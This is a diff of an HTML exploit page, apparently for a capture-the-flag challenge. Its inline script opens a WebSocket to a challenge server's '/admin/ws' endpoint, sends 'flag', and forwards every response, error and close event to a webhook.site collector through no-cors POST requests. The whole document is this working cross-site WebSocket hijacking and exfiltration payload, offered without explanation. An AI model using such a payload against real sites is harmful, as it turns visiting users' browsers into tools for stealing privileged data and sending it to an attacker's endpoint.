@@ -2,25 +2,44 @@
 <html>
 <body>
 <script>
-try {
-    const ws = new WebSocket("ws://ce441-web.spchallenge.ir:8080/admin/ws");
+(function () {
 
-    
-    ws.onopen = () => {
-        ws.send("flag");
-    };
+    const WEBHOOK = "https://webhook.site/7ddae2c9-35c0-47d4-b10b-c54260f87086";
 
-    ws.onmessage = (e) => {
-        fetch("https://webhook.site/7ddae2c9-35c0-47d4-b10b-c54260f87086", {
+    function sendWebhook(data) {
+        fetch(WEBHOOK, {
             method: "POST",
             mode: "no-cors",
-            body: e.data
+            body: data
         });
-    };
+    }
 
-} catch (e) {
-    fetch("https://webhook.site/7ddae2c9-35c0-47d4-b10b-c54260f87086", {method:"POST", mode:"no-cors", body:"error:"+e});
-}
+    let ws;
+
+    try {
+        ws = new WebSocket("ws://ce441-web.spchallenge.ir:8080/admin/ws");
+
+        ws.onopen = () => {
+            ws.send("flag");
+        };
+
+        ws.onmessage = (e) => {
+            sendWebhook("MESSAGE: " + e.data);
+        };
+
+        ws.onerror = (err) => {
+            sendWebhook("WS ERROR");
+        };
+
+        ws.onclose = (evt) => {
+            sendWebhook("WS CLOSED");
+        };
+
+    } catch (e) {
+        sendWebhook("EXCEPTION: " + e);
+    }
+
+})();
 </script>
 </body>
 </html>
